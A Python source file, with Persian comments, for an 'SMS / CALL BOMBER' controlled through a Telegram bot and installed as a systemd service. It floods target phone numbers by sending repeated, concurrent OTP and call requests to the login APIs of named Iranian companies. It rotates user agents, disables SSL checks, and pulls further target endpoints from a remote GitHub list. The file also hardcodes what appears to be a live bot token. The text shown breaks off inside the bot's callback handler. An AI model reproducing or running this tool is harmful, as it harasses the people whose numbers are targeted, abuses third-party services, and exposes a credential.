#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
╔══════════════════════════════════════════════════════════════════════╗
║  SMS / CALL BOMBER — Ultimate Red Edition (v5 · Single File)          ║
║  نصب خودکار + ربات تلگرام + سرویس systemd — همه در یک فایل             ║
╠══════════════════════════════════════════════════════════════════════╣
║  اجرا روی سرور لینوکس:                                                ║
║      sudo python3 sms_bomber.py                                       ║
║  همین یک دستور: وابستگی‌ها، venv، سرویس systemd و ربات را می‌سازد.      ║
╠══════════════════════════════════════════════════════════════════════╣
║  دستورات:  --install  --update  --status  --start  --stop  --restart  ║
║            --logs  --uninstall  --run (systemd)  --gui                ║
╚══════════════════════════════════════════════════════════════════════╝
سازنده: @do1v1
"""

from __future__ import annotations

import argparse
import csv
import json
import os
import queue
import random
import re
import shutil
import signal
import subprocess
import sys
import threading
import time
import traceback
from collections import deque
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass, field
from datetime import datetime
from typing import Any, Dict, List, Optional

# ╔══════════════════════════════════════════════════════════════════════╗
# ║              ▼▼▼   تنظیمات — فقط این بخش را ویرایش کنید   ▼▼▼          ║
# ╚══════════════════════════════════════════════════════════════════════╝
BOT_TOKEN = "8383517627:AAG2RTpJAqpFUeUZbGB8Djc_Ev0SkoLkkds"
ADMIN_ID = 6555739510                 # فقط این شناسه اجازه دسترسی دارد

SERVICE_NAME = "sms-bomber"           # نام سرویس systemd
INSTALL_DIR = "/opt/sms-bomber"       # محل نصب
SERVICES_URL = "https://raw.githubusercontent.com/stone100101-sudo/services/refs/heads/main/services.json"

POLL_TIMEOUT = 25                     # ثانیه
MAX_LOG_LINES = 400
# ════════════════════════════════════════════════════════════════════════

APP_VERSION = "5.0"

# ── وابستگی‌های اختیاری ──
try:
    import requests
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    HAS_REQUESTS = True
except Exception:
    requests = None
    HAS_REQUESTS = False

try:
    import tkinter as tk
    from tkinter import ttk, messagebox, filedialog
    from tkinter.scrolledtext import ScrolledText
    HAS_TK = True
except Exception:
    tk = None
    HAS_TK = False

try:
    from fake_useragent import UserAgent
    HAS_FUA = True
except Exception:
    HAS_FUA = False

# ── مسیرها ──
def _base_dir() -> str:
    return INSTALL_DIR if os.path.isdir(INSTALL_DIR) else os.path.dirname(os.path.abspath(__file__))

BASE_DIR = _base_dir()
SETTINGS_FILE = os.path.join(BASE_DIR, "bot_settings.json")
CACHE_FILE = os.path.join(BASE_DIR, "services_cache.json")
RUNTIME_LOG = os.path.join(BASE_DIR, "bot.log")
PID_FILE = os.path.join(BASE_DIR, "bot.pid")

SERVICE_PATH = f"/etc/systemd/system/{SERVICE_NAME}.service"
VENV_DIR = os.path.join(INSTALL_DIR, "venv")
PY_DEPS = ["requests", "urllib3", "fake-useragent"]

PHONE_RE = re.compile(r"^(?:\+98|98|0)?9\d{9}$")

C = {"bg": "#0b0b0f", "panel": "#14141c", "panel2": "#1c1c26", "fg": "#e8e8ee",
     "accent": "#ff2b4a", "accent2": "#ff6b81", "ok": "#28c76f", "warn": "#ffb020",
     "err": "#ff4d4d", "muted": "#7a7a8c", "entry": "#0f0f16", "sel": "#3a0d18"}

GREEN, RED, YELLOW, CYAN, RESET = "\033[32m", "\033[31m", "\033[33m", "\033[36m", "\033[0m"


def say(msg, color=""):
    print(f"{color}{msg}{RESET}")


def ts() -> str:
    return datetime.now().strftime("%Y-%m-%d %H:%M:%S")


def mask_token(token: str) -> str:
    return f"{token.split(':')[0]}:***" if token else "-"


def esc(text: str) -> str:
    return str(text).replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")


# ═════════════════════════════ سرویس‌های جایگزین ═════════════════════════════
FALLBACK_SERVICES = [
    {"name": "Snapp", "type": "sms", "category": "سفر", "method": "POST",
     "url": "https://app.snapp.taxi/api/api-passenger-oauth/v2/otp",
     "payload": {"cellphone": "{phone_full}"}},
    {"name": "Divar", "type": "sms", "category": "فروشگاه", "method": "POST",
     "url": "https://api.divar.ir/v5/auth/authenticate", "payload": {"phone": "{phone}"}},
    {"name": "Digikala", "type": "sms", "category": "فروشگاه", "method": "POST",
     "url": "https://api.digikala.com/v1/user/authenticate/", "payload": {"username": "{phone}"}},
    {"name": "Tap30", "type": "sms", "category": "سفر", "method": "POST",
     "url": "https://tap33.me/api/v2/user",
     "payload": {"credential": {"phoneNumber": "{phone}", "role": "PASSENGER"}}},
    {"name": "Alibaba", "type": "sms", "category": "سفر", "method": "POST",
     "url": "https://ws.alibaba.ir/api/v3/account/mobile/otp", "payload": {"phoneNumber": "{phone}"}},
    {"name": "Sheypoor", "type": "sms", "category": "فروشگاه", "method": "POST",
     "url": "https://www.sheypoor.com/api/v10.0.0/auth/send", "payload": {"username": "{phone}"}},
]


def _normalize(raw: Any) -> Optional[dict]:
    if not isinstance(raw, dict):
        return None
    name, url = raw.get("name"), raw.get("url")
    if not name or not url:
        return None
    svc = {"name": str(name),
           "type": "call" if raw.get("type") == "call" else "sms",
           "category": str(raw.get("category", "متفرقه")),
           "method": str(raw.get("method", "POST")).upper(),
           "url": str(url)}
    for key in ("payload", "data", "params", "headers"):
        if key in raw and raw[key] is not None:
            svc[key] = raw[key]
    return svc


def _clean(raw_list: Any) -> List[dict]:
    if not isinstance(raw_list, list):
        return []
    out, seen = [], set()
    for item in raw_list:
        svc = _normalize(item)
        if svc and svc["name"] not in seen:
            seen.add(svc["name"])
            out.append(svc)
    return out


def load_services(timeout: float = 10.0):
    """گیت‌هاب → کش محلی → جایگزین داخلی. خروجی: (services, source)"""
    if HAS_REQUESTS:
        try:
            r = requests.get(SERVICES_URL, timeout=timeout,
                             headers={"User-Agent": f"SMSBomber/{APP_VERSION}",
                                      "Cache-Control": "no-cache"})
            r.raise_for_status()
            data = _clean(r.json())
            if data:
                try:
                    with open(CACHE_FILE, "w", encoding="utf-8") as f:
                        json.dump(data, f, ensure_ascii=False, indent=1)
                except Exception:
                    pass
                return data, "github"
        except Exception:
            pass
    try:
        with open(CACHE_FILE, encoding="utf-8") as f:
            data = _clean(json.load(f))
        if data:
            return data, "cache"
    except Exception:
        pass
    return _clean(FALLBACK_SERVICES), "embedded"


# ═════════════════════════════ ابزار شبکه ═════════════════════════════
class UAPool:
    _FALLBACK = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Linux; Android 14; SM-S928B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1",
    ]

    def __init__(self):
        self._ua = None
        if HAS_FUA:
            try:
                self._ua = UserAgent(fallback=self._FALLBACK[0])
            except Exception:
                self._ua = None

    def headers(self) -> Dict[str, str]:
        ua = random.choice(self._FALLBACK)
        if self._ua is not None:
            try:
                ua = self._ua.random
            except Exception:
                pass
        h = {"User-Agent": ua,
             "Accept": random.choice(["application/json, text/plain, */*",
                                      "text/html,application/xhtml+xml,*/*;q=0.8", "*/*"]),
             "Accept-Language": random.choice(["fa-IR,fa;q=0.9,en;q=0.8", "en-US,en;q=0.9"]),
             "Connection": "keep-alive"}
        if random.random() < 0.4:
            h["Referer"] = random.choice(["https://www.google.com/", "https://www.bing.com/"])
        return h


UA = UAPool()
_tls = threading.local()


def get_session(pool_size: int = 32):
    s = getattr(_tls, "session", None)
    if s is None:
        s = requests.Session()
        ad = requests.adapters.HTTPAdapter(pool_connections=pool_size,
                                           pool_maxsize=pool_size, max_retries=0)
        s.mount("https://", ad); s.mount("http://", ad)
        _tls.session = s
    return s


def phone_variants(raw: str) -> Dict[str, str]:
    raw = re.sub(r"[^\d+]", "", raw.strip())
    if raw.startswith("+98"):
        nz = raw[3:]
    elif raw.startswith("98"):
        nz = raw[2:]
    elif raw.startswith("0"):
        nz = raw[1:]
    else:
        nz = raw
    return {"phone": raw if raw.startswith("0") else "0" + nz,
            "phone_full": "+98" + nz, "phone_98": "98" + nz, "phone_nz": nz}


def deep_format(obj: Any, fmt: Dict[str, str]) -> Any:
    if isinstance(obj, dict):
        return {k: deep_format(v, fmt) for k, v in obj.items()}
    if isinstance(obj, list):
        return [deep_format(v, fmt) for v in obj]
    if isinstance(obj, str):
        for k, v in fmt.items():
            obj = obj.replace("{" + k + "}", v)
        return obj
    return obj


# ═════════════════════════════ مدل‌ها ═════════════════════════════
@dataclass
class Config:
    phones: List[str] = field(default_factory=list)
    rounds: int = 2
    concurrency: int = 12
    delay_min: float = 0.3
    delay_max: float = 0.8
    timeout: float = 12.0
    retries: int = 1
    verify_ssl: bool = False
    services: List[dict] = field(default_factory=list)


@dataclass
class Result:
    service: str
    phone: str
    ok: bool
    status: Optional[int]
    latency: float
    error: str = ""


# ═════════════════════════════ موتور ═════════════════════════════
class Engine:
    def __init__(self, cfg: Config, on_result=None, on_progress=None, on_log=None, on_total=None):
        self.cfg = cfg
        self.on_result = on_result or (lambda r: None)
        self.on_progress = on_progress or (lambda a, b: None)
        self.on_log = on_log or (lambda t, tag="": None)
        self.on_total = on_total or (lambda n: None)
        self.stop_evt = threading.Event()
        self.pause_evt = threading.Event()
        self._rl_lock = threading.Lock()
        self._next_slot = 0.0
        self.total = self.done = self.ok = self.fail = 0

    def _rate_limit(self):
        dmin, dmax = self.cfg.delay_min, self.cfg.delay_max
        if dmax <= 0:
            return
        with self._rl_lock:
            now = time.monotonic()
            wait = self._next_slot - now
            if wait > 0:
                time.sleep(wait)
            self._next_slot = max(now, self._next_slot) + random.uniform(dmin, dmax)

    def _wait_if_paused(self):
        while self.pause_evt.is_set() and not self.stop_evt.is_set():
            time.sleep(0.05)

    def _build(self, svc: dict, fmt: Dict[str, str]):
        url = deep_format(svc["url"], fmt)
        headers = UA.headers()
        if "headers" in svc:
            headers.update(deep_format(svc["headers"], fmt))
        method = svc.get("method", "POST").upper()
        kw = {"headers": headers, "timeout": self.cfg.timeout, "verify": self.cfg.verify_ssl}
        if "payload" in svc:
            kw["json"] = deep_format(svc["payload"], fmt)
        elif "data" in svc:
            d = deep_format(svc["data"], fmt)
            kw["data"] = d if isinstance(d, str) else json.dumps(d)
        if "params" in svc:
            kw["params"] = deep_format(svc["params"], fmt)
        return method, url, kw

    def execute(self, svc: dict, phone: str) -> Result:
        self._wait_if_paused()
        if self.stop_evt.is_set():
            return Result(svc["name"], phone, False, None, 0.0, "لغو شد")
        fmt = phone_variants(phone)
        method, url, kw = self._build(svc, fmt)
        session = get_session()
        t0 = time.perf_counter()
        last = ""
        for attempt in range(self.cfg.retries + 1):
            if attempt:
                time.sleep(0.4 * attempt)
            self._rate_limit()
            try:
                r = session.post(url, **kw) if method == "POST" else session.get(url, **kw)
                lat = time.perf_counter() - t0
                if 200 <= r.status_code < 300:
                    return Result(svc["name"], phone, True, r.status_code, lat)
                last = f"HTTP {r.status_code}"
            except requests.exceptions.Timeout:
                last = "Timeout"
            except requests.exceptions.ConnectionError:
                last = "خطای اتصال"
            except Exception as e:
                last = type(e).__name__
        return Result(svc["name"], phone, False, None, time.perf_counter() - t0, last)

    def run(self):
        tasks = [(s, p) for _ in range(self.cfg.rounds)
                 for p in self.cfg.phones for s in self.cfg.services]
        self.total = len(tasks)
        self.on_total(self.total)
        with ThreadPoolExecutor(max_workers=self.cfg.concurrency) as ex:
            futures = [ex.submit(self.execute, s, p) for s, p in tasks]
            for fut in as_completed(futures):
                res = fut.result()
                self.done += 1
                self.ok += 1 if res.ok else 0
                self.fail += 0 if res.ok else 1
                self.on_result(res)
                self.on_progress(self.done, self.total)
        self.on_log(f"پایان — {self.done} تسک پردازش شد.")


# ═════════════════════════════ کنترلر ═════════════════════════════
DEFAULT_SETTINGS = {
    "bot_token": BOT_TOKEN, "admin_id": ADMIN_ID,
    "phones": ["09123456789"],
    "rounds": 2, "concurrency": 12,
    "delay_min": 0.3, "delay_max": 0.8,
    "timeout": 12.0, "retries": 1,
    "verify_ssl": False, "mode": "both",
    "enabled": None,
}


class Controller:
    def __init__(self):
        self.lock = threading.RLock()
        self.services: List[dict] = []
        self.source = "..."
        self.settings = dict(DEFAULT_SETTINGS)
        self.engine: Optional[Engine] = None
        self.thread: Optional[threading.Thread] = None
        self.running = self.paused = False
        self.start_ts = 0.0
        self.last_run: Optional[str] = None
        self.last_error = ""
        self.stats = {"sent": 0, "ok": 0, "fail": 0}
        self.svc_stats: Dict[str, List[int]] = {}
        self.results: List[dict] = []
        self.logs = deque(maxlen=MAX_LOG_LINES)
        self.load_settings()
        self.reload_services()

    def log(self, text: str, tag: str = ""):
        line = f"[{ts()}] {text}"
        self.logs.append(line)
        try:
            with open(RUNTIME_LOG, "a", encoding="utf-8") as f:
                f.write(line + "\n")
        except Exception:
            pass

    def load_settings(self):
        if os.path.exists(SETTINGS_FILE):
            try:
                with open(SETTINGS_FILE, encoding="utf-8") as f:
                    data = json.load(f)
                self.settings.update({k: v for k, v in data.items() if k in DEFAULT_SETTINGS})
            except Exception as e:
                self.last_error = f"خطای خواندن تنظیمات: {e}"

    def save_settings(self) -> bool:
        try:
            with open(SETTINGS_FILE, "w", encoding="utf-8") as f:
                json.dump(self.settings, f, ensure_ascii=False, indent=2)
            return True
        except Exception as e:
            self.last_error = f"خطای ذخیره تنظیمات: {e}"
            return False

    def reload_services(self):
        services, source = load_services()
        with self.lock:
            self.services, self.source = services, source
        self.log(f"سرویس‌ها بارگذاری شد ({len(services)} مورد، منبع: {source})")

    def enabled_services(self) -> List[dict]:
        with self.lock:
            if self.settings.get("enabled") is None:
                return list(self.services)
            allowed = set(self.settings["enabled"])
            return [s for s in self.services if s["name"] in allowed]

    def pick_services(self) -> List[dict]:
        mode = self.settings.get("mode", "both")
        items = self.enabled_services()
        return items if mode == "both" else [s for s in items if s["type"] == mode]

    def start(self) -> str:
        with self.lock:
            if self.running:
                return "حمله در حال اجراست."
            services = self.pick_services()
            phones = self.settings.get("phones") or []
            if not services:
                return "هیچ سرویسی فعال نیست."
            if not phones:
                return "شماره‌ای تنظیم نشده است."
            dmin, dmax = self.settings["delay_min"], self.settings["delay_max"]
            if dmin > dmax:
                dmin, dmax = dmax, dmin
            cfg = Config(phones=list(phones), rounds=int(self.settings["rounds"]),
                         concurrency=int(self.settings["concurrency"]),
                         delay_min=dmin, delay_max=dmax,
                         timeout=float(self.settings["timeout"]),
                         retries=int(self.settings["retries"]),
                         verify_ssl=bool(self.settings["verify_ssl"]), services=services)
            self.stats = {"sent": 0, "ok": 0, "fail": 0}
            self.svc_stats.clear(); self.results.clear()
            self.start_ts = time.time()
            self.running, self.paused = True, False
            self.engine = Engine(cfg, self._on_result, None, self._on_log, None)
            self.thread = threading.Thread(target=self._run, daemon=True)
            self.thread.start()
            self.log(f"شروع حمله: {len(services)} سرویس × {len(phones)} شماره × {cfg.rounds} دور")
            return f"🚀 حمله شروع شد\nسرویس: {len(services)} | شماره: {len(phones)} | دور: {cfg.rounds}"

    def _run(self):
        try:
            self.engine.run()
        except Exception as e:
            self.last_error = f"{type(e).__name__}: {e}"
            self.log(f"خطای موتور: {self.last_error}")
        finally:
            self.running = self.paused = False
            self.last_run = ts()
            self.log("حمله پایان یافت.")

    def _on_result(self, res):
        with self.lock:
            self.stats["sent"] += 1
            self.stats["ok" if res.ok else "fail"] += 1
            st = self.svc_stats.setdefault(res.service, [0, 0])
            st[0 if res.ok else 1] += 1
            if len(self.results) < 5000:
                self.results.append({"service": res.service, "phone": res.phone, "ok": res.ok,
                                     "status": res.status, "latency": res.latency, "error": res.error})

    def _on_log(self, text, tag=""):
        self.log(text)

    def pause(self) -> str:
        if not self.running or not self.engine:
            return "حمله در حال اجرا نیست."
        if self.paused:
            self.engine.pause_evt.clear(); self.paused = False
            return "▶️ ادامه یافت."
        self.engine.pause_evt.set(); self.paused = True
        return "⏸ متوقف شد (موقت)."

    def stop(self) -> str:
        if not self.running or not self.engine:
            return "حمله در حال اجرا نیست."
        self.engine.stop_evt.set(); self.engine.pause_evt.clear()
        self.running = self.paused = False
        self.last_run = ts()
        self.log("توقف دستی حمله.")
        return "⏹ متوقف شد."

    def status_text(self) -> str:
        with self.lock:
            state = "⏸ موقت" if self.paused else ("▶️ در حال اجرا" if self.running else "⏹ متوقف")
            el = int(time.time() - self.start_ts) if self.running else 0
            m, s = divmod(el, 60)
            src = {"github": "گیت‌هاب", "cache": "کش محلی", "embedded": "داخلی"}.get(self.source, self.source)
            return (f"<b>📊 وضعیت</b>\n"
                    f"وضعیت حمله: <b>{state}</b>\n"
                    f"مدت اجرا: <code>{m:02d}:{s:02d}</code>\n"
                    f"ارسال: <b>{self.stats['sent']}</b> | ✅ {self.stats['ok']} | ❌ {self.stats['fail']}\n"
                    f"سرویس‌های فعال: <b>{len(self.enabled_services())}</b> از {len(self.services)}\n"
                    f"منبع سرویس‌ها: <b>{src}</b>\n"
                    f"سرویس systemd: <b>{systemctl('is-active')}</b>\n"
                    f"آخرین اجرا: <code>{self.last_run or '—'}</code>\n"
                    f"آخرین خطا: <code>{esc(self.last_error) or '—'}</code>")


# ═════════════════════════════ systemd ═════════════════════════════
def _run_cmd(args: List[str]):
    try:
        p = subprocess.run(args, capture_output=True, text=True, timeout=30)
        return p.returncode, (p.stdout + p.stderr).strip()
    except FileNotFoundError:
        return 127, "دستور پیدا نشد"
    except subprocess.TimeoutExpired:
        return 124, "تایم‌اوت"
    except Exception as e:
        return 1, str(e)


def systemctl(action: str) -> str:
    code, out = _run_cmd(["systemctl", action, SERVICE_NAME])
    if code != 0:
        code2, out2 = _run_cmd(["sudo", "-n", "systemctl", action, SERVICE_NAME])
        if code2 == 0:
            return out2.splitlines()[0] if out2 else "ok"
    return out.splitlines()[0] if out else ("ok" if code == 0 else "خطا")


def journal_tail(n: int = 25) -> str:
    code, out = _run_cmd(["journalctl", "-u", SERVICE_NAME, "-n", str(n), "--no-pager"])
    if code != 0:
        code, out = _run_cmd(["sudo", "-n", "journalctl", "-u", SERVICE_NAME, "-n", str(n), "--no-pager"])
    return out or "خروجی‌ای موجود نیست."


# ═════════════════════════════ ربات تلگرام ═════════════════════════════
SETTING_LABELS = {
    "phones": ("شماره‌ها (با کاما)", ""), "rounds": ("تعداد دور", ""),
    "concurrency": ("تعداد ترد همزمان", ""), "delay_min": ("تأخیر حداقل", "ثانیه"),
    "delay_max": ("تأخیر حداکثر", "ثانیه"), "timeout": ("تایم‌اوت", "ثانیه"),
    "retries": ("تعداد تلاش مجدد", ""),
}

HELP = ("<b>❓ راهنما</b>\n\n"
        "/start یا /menu — منوی اصلی\n/status — وضعیت\n/logs — آخرین گزارش‌ها\n"
        "/stop — توقف فوری\n/help — همین متن\n\n"
        "همه دکمه‌ها Inline هستند و نیازی به تایپ ندارید.")


def main_menu() -> dict:
    return {"inline_keyboard": [
        [{"text": "▶️ شروع", "callback_data": "st:start"},
         {"text": "⏸ موقت", "callback_data": "st:pause"},
         {"text": "⏹ توقف", "callback_data": "st:stop"}],
        [{"text": "📊 وضعیت", "callback_data": "nav:status"},
         {"text": "⚙️ تنظیمات", "callback_data": "nav:settings"}],
        [{"text": "📋 سرویس‌ها", "callback_data": "nav:services"},
         {"text": "🔍 تست سرور", "callback_data": "nav:test"}],
        [{"text": "📝 گزارش‌ها", "callback_data": "nav:logs"},
         {"text": "📈 آمار", "callback_data": "nav:stats"}],
        [{"text": "🖥 مدیریت سیستم", "callback_data": "nav:sys"},
         {"text": "💾 ذخیره", "callback_data": "nav:save"}],
        [{"text": "❓ راهنما", "callback_data": "nav:help"}],
    ]}


def back_kb(target: str = "nav:main") -> dict:
    return {"inline_keyboard": [[{"text": "🏠 بازگشت", "callback_data": target}]]}


def settings_kb(s: dict) -> dict:
    return {"inline_keyboard": [
        [{"text": "📱 شماره‌ها", "callback_data": "set:phones"},
         {"text": "🔁 دور", "callback_data": "set:rounds"}],
        [{"text": "🧵 ترد", "callback_data": "set:concurrency"},
         {"text": "⌛ تایم‌اوت", "callback_data": "set:timeout"}],
        [{"text": "⏱ تأخیر حداقل", "callback_data": "set:delay_min"},
         {"text": "⏱ تأخیر حداکثر", "callback_data": "set:delay_max"}],
        [{"text": "🔂 تلاش مجدد", "callback_data": "set:retries"}],
        [{"text": f"🔐 SSL: {'روشن' if s['verify_ssl'] else 'خاموش'}", "callback_data": "tgl:verify_ssl"}],
        [{"text": f"🎯 حالت: {s['mode']}", "callback_data": "tgl:mode"}],
        [{"text": "🏠 منو", "callback_data": "nav:main"}],
    ]}


def sys_kb() -> dict:
    return {"inline_keyboard": [
        [{"text": "🔄 ری‌استارت", "callback_data": "sys:restart"},
         {"text": "▶️ استارت", "callback_data": "sys:start"}],
        [{"text": "⏹ استاپ", "callback_data": "sys:stop"},
         {"text": "📊 وضعیت", "callback_data": "sys:status"}],
        [{"text": "📜 ژورنال سیستم", "callback_data": "sys:journal"}],
        [{"text": "🏠 منو", "callback_data": "nav:main"}],
    ]}


class Bot:
    def __init__(self, token: str, admin: int):
        self.token, self.admin = token, int(admin)
        self.base = f"https://api.telegram.org/bot{token}"
        self.ctrl = Controller()
        self.offset = None
        self.awaiting: Optional[dict] = None
        self._pending_key = None
        self.svc_page, self.svc_query = 0, ""
        self.shutdown = False

    # ---------- API ----------
    def api(self, method: str, files=None, **params):
        try:
            if files:
                r = requests.post(f"{self.base}/{method}", data=params, files=files, timeout=60)
            else:
                r = requests.post(f"{self.base}/{method}", json=params, timeout=60)
            return r.json()
        except Exception as e:
            self.ctrl.log(f"خطای API {method}: {type(e).__name__}")
            return {"ok": False, "description": str(e)}

    @staticmethod
    def _split(text: str, limit: int = 3900) -> List[str]:
        if len(text) <= limit:
            return [text]
        parts, cur = [], ""
        for line in text.split("\n"):
            if len(cur) + len(line) + 1 > limit:
                parts.append(cur); cur = ""
            cur += line + "\n"
        parts.append(cur)
        return [p for p in parts if p]

    def send(self, text: str, kb: dict = None, chat: int = None):
        for chunk in self._split(text):
            self.api("sendMessage", chat_id=chat or self.admin, text=chunk,
                     parse_mode="HTML", reply_markup=kb, disable_web_page_preview=True)
            kb = None

    def edit(self, chat: int, msg_id: int, text: str, kb: dict = None):
        self.api("editMessageText", chat_id=chat, message_id=msg_id, text=text,
                 parse_mode="HTML", reply_markup=kb)

    def answer(self, cb_id: str, text: str = ""):
        self.api("answerCallbackQuery", callback_query_id=cb_id, text=text)

    def send_file(self, path: str, caption: str = ""):
        if not os.path.exists(path):
            self.send("فایلی برای ارسال نیست."); return
        try:
            with open(path, "rb") as f:
                self.api("sendDocument", chat_id=self.admin, caption=caption,
                         document=("report.txt", f))
        except Exception as e:
            self.send(f"خطای ارسال فایل: {e}")

    # ---------- polling ----------
    def run(self):
        me = self.api("getMe")
        if not me.get("ok"):
            raise RuntimeError(f"توکن نامعتبر یا اتصال برقرار نشد: {me.get('description')}")
        self.ctrl.log(f"ربات @{me['result'].get('username')} راه‌اندازی شد")
        self.send(f"✅ ربات راه‌اندازی شد.\nنسخه {APP_VERSION}\nاز منو استفاده کنید.", main_menu())
        while not self.shutdown:
            try:
                upd = self.api("getUpdates", offset=self.offset, timeout=POLL_TIMEOUT,
                               allowed_updates=["message", "callback_query"])
                if not upd.get("ok"):
                    time.sleep(3); continue
                for u in upd["result"]:
                    self.offset = u["update_id"] + 1
                    try:
                        self.handle(u)
                    except Exception:
                        self.ctrl.log("خطا در پردازش:\n" + traceback.format_exc(limit=3))
            except KeyboardInterrupt:
                break
            except Exception as e:
                self.ctrl.log(f"خطای polling: {type(e).__name__}")
                time.sleep(3)

    def handle(self, u: dict):
        if "callback_query" in u:
            cq = u["callback_query"]
            if cq["from"]["id"] != self.admin:
                self.answer(cq["id"], "دسترسی ندارید"); return
            self.answer(cq["id"])
            self.on_callback(cq["message"]["chat"]["id"], cq["message"]["message_id"], cq["data"])
        elif "message" in u:
            m = u["message"]
            if m["from"]["id"] != self.admin:
                self.send("⛔ دسترسی فقط برای ادمین.", chat=m["chat"]["id"]); return
            self.on_message(m)

    def on_message(self, m: dict):
        text = (m.get("text") or "").strip()
        if self.awaiting and text and not text.startswith("/"):
            self.on_input(text); return
        cmd = text.split()[0].lower() if text else ""
        if cmd in ("/start", "/sms", "/menu"):
            self.send("🏠 <b>منوی اصلی</b>", main_menu())
        elif cmd == "/status":
            self.send(self.ctrl.status_text(), main_menu())
        elif cmd == "/help":
            self.send(HELP, main_menu())
        elif cmd == "/logs":
            self.show_logs()
        elif cmd == "/stop":
            self.send(self.ctrl.stop(), main_menu())
        else:
            self.send("دستور ناشناخته. /help", main_menu())

    def on_input(self, text: str):
        kind = self.awaiting.get("kind")
        self.awaiting = None
        if kind == "phones":
            parts = [p.strip() for p in re.split(r"[,\s;]+", text) if p.strip()]
            bad = [p for p in parts if not PHONE_RE.match(p)]
            if bad:
                self.send("❌ شماره نامعتبر:\n" + "\n".join(bad), main_menu()); return
            self.ctrl.settings["phones"] = parts
            self.ctrl.save_settings()
            self.send(f"✅ {len(parts)} شماره ذخیره شد.", main_menu())
        elif kind == "setting" and self._pending_key:
            self.apply_setting(self._pending_key, text)
        elif kind == "svc_query":
            self.svc_query = text; self.svc_page = 0; self.show_services()
        elif kind == "test":
            if not PHONE_RE.match(text):
                self.send("❌ شماره نامعتبر.", main_menu()); return
            self._start_test_flow(text)

    def apply_setting(self, key: str, text: str):
        s = self.ctrl.settings
        try:
            if key in ("rounds", "concurrency", "retries"):
                s[key] = int(text)
            elif key in ("delay_min", "delay_max", "timeout"):
                s[key] = float(text)
            else:
                s[key] = text
        except ValueError:
            self.send("❌ مقدار عددی نامعتبر.", main_menu()); return
        self.ctrl.save_settings()
        self.send(f"✅ {SETTING_LABELS.get(key, (key,))[0]} به <code>{s[key]}</code> تغییر کرد.",
                  main_menu())

    def on_callback(self, chat: int, msg_id: int, data: str):
        try:
            if data == "nav:main":
                self.edit(chat, msg_id, "🏠 <b>منوی اصلی</b>", main_menu())
            elif data == "nav:status":
                self.edit(chat, msg_id, self.ctrl.status_text(), back_kb())
            elif data == "st:start":
                self.send(self.ctrl.start(), main_menu())
            elif data == "st:pause":
                self.send(self.ctrl.pause(), main_menu())
            elif data == "st:stop":
                self.send(self.ctrl.stop(), main_menu())
            elif data == "nav:settings":
                self.edit(chat, msg_id, self.settings_text(), settings_kb(self.ctrl.settings))
            elif data.startswith("set:"):
                self._pending_key = data[4:]
                self.awaiting = {"kind": "setting"}
                label, unit = SETTING_LABELS.get(self._pending_key, (self._pending_key, ""))
                cur = self.ctrl.settings.get(self._pending_key)
                self.edit(chat, msg_id,
                          f"✏️ مقدار جدید <b>{label}</b> را بفرستید.\nمقدار فعلی: <code>{cur}</code> {unit}",
                          back_kb("nav:settings"))
            elif data.startswith("tgl:"):
                key = data[4:]
                if key == "verify_ssl":
                    self.ctrl.settings[key] = not self.ctrl.settings[key]
                elif key == "mode":
                    order = ["both", "sms", "call"]
                    self.ctrl.settings["mode"] = order[(order.index(self.ctrl.settings["mode"]) + 1) % 3]
                self.ctrl.save_settings()
                self.edit(chat, msg_id, self.settings_text(), settings_kb(self.ctrl.settings))
            elif data == "nav:services":
                self.svc_page = 0; self.show_services(chat, msg_id)
            elif data.startswith("svcp:"):
                self.svc_page = int(data[5:]); self.show_services(chat, msg_id)
            elif data.startswith("svct:"):
                idx = int(data[5:])
                items = self.filtered_services()
                if 0 <= idx < len(items):
                    name = items[idx]["name"]
                    if self.ctrl.settings["enabled"] is None:
                        self.ctrl.settings["enabled"] = [s["name"] for s in self.ctrl.services]
                    if name in self.ctrl.settings["enabled"]:
                        self.ctrl.settings["enabled"].remove(name)
                    else:
                        self.ctrl.settings["enabled"].append(name)
                    self.ctrl.save_settings()
                self.show_services(chat, msg_id)
            elif data == "svc:all":
                self.ctrl.settings["enabled"] = [s["name"] for s in self.ctrl.services]
                self.ctrl.save_settings(); self.show_services(chat, msg_id)
            elif data == "svc:none":
                self.ctrl.settings["enabled"] = []
                self.ctrl.save_settings(); self.show_services(chat, msg_id)
            elif data == "svc:invert":
                cur = set(self.ctrl.settings["enabled"] or [s["name"] for s in self.ctrl.services])
                self.ctrl.settings["enabled"] = [s["name"] for s in self.ctrl.services if s["name"] not in cur]
                self.ctrl.save_settings(); self.show_services(chat, msg_id)
            elif data == "svc:find":
                self.awaiting = {"kind": "svc_query"}
                self.edit(chat, msg_id, "🔎 عبارت جستجو را بفرستید (خالی = همه):", back_kb("nav:services"))
            elif data == "svc:reload":
                self.send("⏳ در حال بروزرسانی از گیت‌هاب...")
                threading.Thread(target=self._reload, daemon=True).start()
            elif data == "nav:test":
                self.awaiting = {"kind": "test"}
                self.edit(chat, msg_id, "🔍 شماره تست را بفرستید:", back_kb())
            elif data == "nav:logs":
                self.show_logs()
            elif data == "log:file":
                self.send_file(RUNTIME_LOG, "گزارش ربات")
            elif data == "nav:stats":
                self.show_stats(chat, msg_id)
            elif data == "nav:sys":
                self.edit(chat, msg_id, self.sys_text(), sys_kb())
            elif data.startswith("sys:"):
                self.sys_action(data[4:])
            elif data == "nav:save":
                self.send("✅ ذخیره شد." if self.ctrl.save_settings() else "❌ خطا.", main_menu())
            elif data == "nav:help":
                self.edit(chat, msg_id, HELP, back_kb())
            elif data == "noop":
                pass
